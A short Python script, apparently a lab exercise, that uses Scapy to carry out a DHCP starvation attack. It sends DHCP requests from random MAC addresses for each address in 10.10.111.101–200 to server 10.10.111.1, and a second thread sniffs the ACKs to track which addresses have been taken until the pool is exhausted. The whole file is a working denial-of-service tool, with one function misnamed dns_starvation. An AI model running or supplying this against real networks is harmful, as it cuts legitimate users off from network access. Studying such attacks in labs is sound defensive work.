import time
import threading
from scapy.all import *

DST_MAC = 'ff:ff:ff:ff:ff:ff'
DST_IP = '255.255.255.255'
SRC_IP = '0.0.0.0'
SERVER_ID = '10.10.111.1'

# use a set to store and monitor remained IP addresses
ip_pool = set()
lock = 1

# this function is used to send dhcp requests
# until there's no available IP address
def dns_starvation():

    global lock
    # start attack after sniff is running
    # time.sleep(0.5)
    # keep sending dhcp requests if there still are IP addresses available
    while len(ip_pool) < 100:

        for i in range(101, 201):
            while lock == 0:
                time.sleep(0.1)
            time.sleep(0.5)
            src_mac = RandMAC()
            request_ip = '10.10.111.' + str(i)
            if request_ip in ip_pool:
                continue

            # form dhcp request packets
            ether = Ether(src=src_mac, dst=DST_MAC)
            ip = IP(src=SRC_IP, dst=DST_IP)
            udp = UDP(sport=68, dport=67)
            bootp = BOOTP(chaddr=src_mac)
            dhcp = DHCP(options=[('message-type', 'request'), 
                                 ('server_id', SERVER_ID), 
                                 ('requested_addr', request_ip), 'end'])
            packet = ether/ip/udp/bootp/dhcp

            sendp(packet, verbose=0)



# this function is used to listen dhcp acks
# and remove binded IPs form IP pool
def listen_ack():

    global lock
    while len(ip_pool) < 100:

        packets = sniff(filter='udp', iface='eth0', timeout=10)
        lock = 0
        for i in range(len(packets)):
            if packets[i][DHCP].options[0][1] == 5:
                ip_pool.add(packets[i][IP].dst)
                print(len(ip_pool))
        lock = 1


# start multi-threats to send dhcp requests and recieve acks
def main():

    func = [dns_starvation, listen_ack]
    threads = []

    for i in range(2):
        t = Thread(target=func[i])
        threads.append(t)

    for t in threads:
        t.start()

    for t in threads:
        t.join()


if __name__ == '__main__':
    main()
